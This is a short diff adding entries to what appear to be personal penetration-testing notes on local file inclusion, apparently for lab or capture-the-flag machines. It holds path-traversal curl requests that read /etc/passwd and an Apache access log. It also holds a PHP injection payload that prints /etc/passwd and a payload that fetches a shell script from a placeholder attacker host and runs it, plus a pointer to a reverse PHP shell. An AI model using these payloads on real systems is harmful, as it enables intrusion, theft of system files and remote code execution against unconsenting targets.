@@ -92,6 +92,10 @@ $exec = system('reverse.exe', $val);
 Another LFI Method: (https://soolascybersecurity.com/2022/02/21/solstice-not-happy-jan/)
 
 - PROVING LFI EXISTS: curl 192.168.238.72:8593?book=../../../../../etc/passwd
+	- Alt: http://192.168.55.94/index.php?page=' and die(show_source('/etc/passwd')) or '
+	- Try URL encoding if not working. 
+	- To get a shell: ' and die(system("curl http://<ip>/shell.php|php")) or '
+		- get a reverse php from pentestmonkey
  
 - TEST ITS PRESENCE: curl 192.168.238.72:8593?book=../../../../../var/log/apache2/access.log 
  
